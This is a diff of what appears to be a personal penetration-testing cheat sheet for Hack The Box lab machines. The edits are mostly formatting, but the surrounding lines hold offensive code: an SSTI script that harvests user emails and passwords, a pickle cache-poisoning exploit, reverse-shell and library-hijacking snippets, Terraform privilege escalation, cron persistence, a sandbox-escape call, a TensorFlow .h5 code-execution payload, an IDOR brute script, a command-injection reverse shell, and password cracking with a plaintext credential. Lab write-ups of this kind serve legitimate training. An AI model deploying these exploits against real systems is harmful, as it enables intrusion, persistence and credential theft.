@@ -4,53 +4,49 @@ icon: scroll
 
 # SCRIPTING AND COMMANDES
 
-## Python Script (SSTI Data Extraction)
+## <mark style="color:red;">Python Script (SSTI Data Extraction)</mark>
 
 {% code fullWidth="true" %}
 ```python
-import re  
-import requests  
-import html  
+import re
+import requests
+import html
 
-url = "http://hacknet.htb"  
-headers = {  
-    'Cookie': "csrftoken=uv50VFGcUZz15IDt9kEWCUa7RrdiTX4f; sessionid=zsb8y28d8wblc60iukbnf188j2uj1w9w"  
-}  
+url = "http://hacknet.htb"
+
+headers = {
+    "Cookie": "csrftoken=uv50VFGcUZz15IDt9kEWCUa7RrdiTX4f; sessionid=zsb8y28d8wblc60iukbnf188j2uj1w9w"
+}
 
 all_users = set()
 
-for i in range(1, 31):  
-    
-    requests.get(f"{url}/like/{i}", headers=headers)  
+for i in range(1, 31):
 
-      
-    text = requests.get(f"{url}/likes/{i}", headers=headers).text  
+    requests.get(f"{url}/like/{i}", headers=headers)
 
-    
-    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
-    if not img_titles:  
-        continue  
-    last_title = html.unescape(img_titles[-1])  
+    text = requests.get(f"{url}/likes/{i}", headers=headers).text
 
-   
-    if "<QuerySet" not in last_title:  
-        requests.get(f"{url}/like/{i}", headers=headers)  
-        text = requests.get(f"{url}/likes/{i}", headers=headers).text  
-        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
-        if img_titles:  
-            last_title = html.unescape(img_titles[-1])  
+    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)
+    if not img_titles:
+        continue
+    last_title = html.unescape(img_titles[-1])
 
-    
-    emails = re.findall(r"'email': '([^']*)'", last_title)  
-    passwords = re.findall(r"'password': '([^']*)'", last_title)  
+    if "<QuerySet" not in last_title:
+        requests.get(f"{url}/like/{i}", headers=headers)
+        text = requests.get(f"{url}/likes/{i}", headers=headers).text
+        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)
+        if img_titles:
+            last_title = html.unescape(img_titles[-1])
 
-    
-    for email, p in zip(emails, passwords):  
-        username = email.split('@')[0]  # 取邮箱前缀  
-        all_users.add(f"{username}:{p}")  
+    emails = re.findall(r"'email': '([^']*)'", last_title)
+    passwords = re.findall(r"'password': '([^']*)'", last_title)
+
+    for email, p in zip(emails, passwords):
+        username = email.split("@")[0]  # 取邮箱前缀
+        all_users.add(f"{username}:{p}")
 
 
-for item in all_users:  
+for item in all_users:
     print(item)
 
 ```
@@ -58,8 +54,9 @@ for item in all_users:
 
 ***
 
-## Python Pickle Exploit (Cache Poisoning)
+## <mark style="color:red;">Python Pickle Exploit (Cache Poisoning)</mark>
 
+{% code fullWidth="true" %}
 ```python
 import pickle
 import os
@@ -84,7 +81,7 @@ for file in os.listdir("/var/tmp/django_cache"):
             f.write(payload)
             
             
-            
+----------------------------------------------------------------------------------------------------            
 mikey@hacknet:/var/tmp/django_cache$ python3 exploit.py 
 HAHA
 1f0acfe7480a469402f1852f8313db86.djcache
@@ -95,10 +92,11 @@ file removed
 90dbab8f3b1e54369abdeb4ba1efc106.djcache
 
 ```
+{% endcode %}
 
 ***
 
-## GPG (Décryptage de Fichiers)
+## <mark style="color:$danger;">GPG (Décryptage de Fichiers)</mark>
 
 ```shellscript
 # Import de la clé privée GPG
@@ -112,7 +110,7 @@ gpg --decrypt backup03.sql.gpg > /home/sandy/decryp3
 
 ***
 
-## gpg2john + John the Ripper
+## <mark style="color:red;">gpg2john + John the Ripper</mark>
 
 ```shellscript
 # Extraction du hash GPG
@@ -124,7 +122,7 @@ john --format=gpg hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ***
 
-## SSH Key Generation
+## <mark style="color:red;">SSH Key Generation</mark>
 
 ```shellscript
 # Génération de clés SSH
@@ -140,8 +138,9 @@ ssh -i sandy sandy@10.10.11.85
 
 ***
 
-## Python script generate XLSX
+## <mark style="color:red;">Python script generate XLSX</mark>
 
+{% code fullWidth="true" %}
 ```python
 from openpyxl import Workbook
 import base64
@@ -169,11 +168,13 @@ wb.save(out_name)
 print(f"[+] Généré: {out_name} (payload length={len(payload)})")
 
 ```
+{% endcode %}
 
 ***
 
-## Python SCRF script
+## <mark style="color:$danger;">Python SCRF script</mark>
 
+{% code fullWidth="true" %}
 ```python
 // Some codeimport requests
 import re
@@ -254,10 +255,11 @@ def run_server():
 threading.Thread(target=run_server).start()
 
 ```
+{% endcode %}
 
 ***
 
-## Python reverse shell inside a normal script
+## <mark style="color:red;">Python reverse shell inside a normal script</mark>
 
 ```python
 import platform
@@ -274,7 +276,7 @@ def system_status():
 
 ***
 
-## C Reverse shell Module
+## <mark style="color:red;">C Reverse shell Module</mark>
 
 ```c
 #include <stdio.h>
@@ -289,7 +291,7 @@ __attribute__((constructor)) void init() {
 
 ***
 
-## Terraform privilege escalation
+## <mark style="color:red;">Terraform privilege escalation</mark>
 
 ```shellscript
 #!/bin/bash
@@ -348,7 +350,7 @@ echo -e "${YELLOW}[!] Executing: /bin/bash -p${NC}\n"
 
 ***
 
-## C Race condition Scriot
+## <mark style="color:red;">C Race condition Scriot</mark>
 
 ```c
 #include <stdio.h>
@@ -373,7 +375,7 @@ int main() {
 
 ***
 
-## Psafe Crak
+## <mark style="color:red;">Psafe Crak</mark>
 
 ```shellscript
 pwsafe2john Backup.psafe3  
@@ -389,7 +391,7 @@ john --wordlist=../rockyou.txt backup.hash
 
 ***
 
-## IPTABLES EXPLOIT SCRIPT
+## <mark style="color:red;">IPTABLES EXPLOIT SCRIPT</mark>
 
 {% code fullWidth="true" %}
 ```shellscript
@@ -403,9 +405,10 @@ chmod 600 ed_25519
 
 ***
 
-## Python Script for JWT key manipulation
+## <mark style="color:red;">Python Script for JWT key manipulation</mark>
 
-```pug
+{% code fullWidth="true" %}
+```python
 # @author Siam Thanat Hack Co., Ltd. (STH)
 import jwt
 import datetime
@@ -450,10 +453,11 @@ r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=Fals
 print(r.text)
 
 ```
+{% endcode %}
 
 ***
 
-## C Library hijacking
+## <mark style="color:red;">C Library hijacking</mark>
 
 ```c
 #include <stdio.h>
@@ -477,10 +481,10 @@ gcc -x c -shared -fPIC -o ./libxcb.so.1
 
 ***
 
-## Cronjob Persistance
+## <mark style="color:red;">Cronjob Persistance</mark>
 
 {% code fullWidth="true" %}
-```
+```bash
 Quality of Life Improvements
 Establish Persistence
 crontab -l 2>/dev/null > /tmp/crontab.txt
@@ -492,9 +496,9 @@ Now, if you lose your reverse shell, you don't need to go through the process of
 
 ***
 
-## BBOT personlized modules abuse with Pyton
+## <mark style="color:red;">BBOT personlized modules abuse with Pyton</mark>
 
-```
+```python
 from bbot.modules.base import BaseModule
 import pty
 import os
@@ -514,7 +518,7 @@ class systeminfo_enum(BaseModule):
         return True
 ```
 
-```
+```shellscript
 sudo /usr/local/bin/bbot -t dummy.com -p /home/graphasm/preset.yml --event-types ROOT
 ```
 
@@ -528,9 +532,9 @@ modules:
 
 ***
 
-## WEB IDE EXPLOIT
+## <mark style="color:$danger;">WEB IDE EXPLOIT</mark>
 
-```
+```python
 module_name = 'o' + 's'
 method_name = 's' + 'y' + 's' + 't' + 'e' + 'm'
 module = sys.modules[module_name]
@@ -538,7 +542,7 @@ method = getattr(module, method_name)
 method('ping -c 3 10.10.14.106')
 ```
 
-```
+```python
 
 for name, obj in globals().items():
     try:
@@ -549,16 +553,18 @@ for name, obj in globals().items():
 
 ***
 
-## Argon 2 Python paasword cracking
+## <mark style="color:red;">Argon 2 Python paasword cracking</mark>
 
-```
+{% code fullWidth="true" %}
+```shellsession
 └─$ python3 -c "import argon2; print(argon2.PasswordHasher().hash('P@ssword@123'))"
 $argon2id$v=19$m=65536,t=3,p=4$5yNzSyjBWFb+8J61AawPkg$R9x9FEBYERukEvHc+DDfQA
 ```
+{% endcode %}
 
 ***
 
-## Script Python pour envoyer des messages Kafka
+## <mark style="color:red;">Script Python pour envoyer des messages Kafka</mark>
 
 ```python
 #!/usr/bin/env python3
@@ -588,18 +594,20 @@ if __name__ == "__main__":
 
 ***
 
-## Bruteforce de la passphrase du CA&#x20;
+## <mark style="color:$danger;">Bruteforce de la passphrase du CA</mark>&#x20;
 
+{% code fullWidth="true" %}
 ```bash
 #!/bin/bash
 while IFS= read -r pass; do
     openssl rsa -in RootCA.key -out /dev/null -passin pass:"$pass" 2>/dev/null && { echo "Password found: $pass"; exit 0; }
 done < /usr/share/wordlists/rockyou.txt
 ```
+{% endcode %}
 
 ***
 
-## Génération du certificat HTTPS
+## <mark style="color:red;">Génération du certificat HTTPS</mark>
 
 {% code fullWidth="true" %}
 ```bash
@@ -623,9 +631,9 @@ Enter pass phrase for RootCA.key: password
 
 ***
 
-## TENSFLOW .H5 RCE PYTHON EXPLOIT
+## <mark style="color:red;">TENSFLOW .H5 RCE PYTHON EXPLOIT</mark>
 
-```
+```python
 import tensorflow as tf
 
 def exploit(x):
@@ -642,7 +650,7 @@ model.save("exploit.h5")
 
 This is very similar looking to the code from the website:
 
-```
+```python
 import numpy as np
 import pandas as pd
 import tensorflow as tf
@@ -699,7 +707,7 @@ model.save("exploit.h5")
 
 ***
 
-## Upgrade the shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q)
+## <mark style="color:red;">Upgrade the shell using the</mark> [<mark style="color:red;">standard trick</mark>](https://www.youtube.com/watch?v=DqE6DxqJg8Q)
 
 ```
 app@artificial:~$ script /dev/null -c bash
@@ -716,7 +724,7 @@ app@artificial:~$
 
 ***
 
-## PYTHON SCRIPT TO IDOR EXPLOIT
+## <mark style="color:red;">PYTHON SCRIPT TO IDOR EXPLOIT</mark>
 
 {% code fullWidth="true" %}
 ```python
@@ -763,7 +771,7 @@ for i in range(10000):
 
 ***
 
-## SMB KERBEROS CONNECTION
+## <mark style="color:red;">SMB KERBEROS CONNECTION</mark>
 
 ```bash
 smbclient.py voleur.htb/ryan.naylor:HollowOct31Nyt@dc.voleur.htb -k
@@ -786,10 +794,10 @@ smb: \>
 
 ***
 
-## REVERSE SHELL WITH COMMANDE INJECTION
+## <mark style="color:red;">REVERSE SHELL WITH COMMANDE INJECTION</mark>
 
 {% code fullWidth="true" %}
-```
+```shellscript
 POST /apply_visual_transform HTTP/1.1
 Host: imagery.htb:8000
 Content-Length: 150
@@ -809,9 +817,10 @@ Connection: keep-alive
 
 ***
 
-## PYTHON AES DECRYPT FILE
+## <mark style="color:red;">PYTHON AES DECRYPT FILE</mark>
 
-```
+{% code fullWidth="true" %}
+```python
 ┌──(venv)─(kali㉿vbox)-[~]
 └─$ cat script.py 
 #!/usr/bin/env python3
@@ -842,3 +851,4 @@ with open(password_file, 'r', encoding='latin-1', errors='ignore') as file:
 └─$ python3 script.py
 ✓ Mot de passe trouvé: bestfriends
 ```
+{% endcode %}
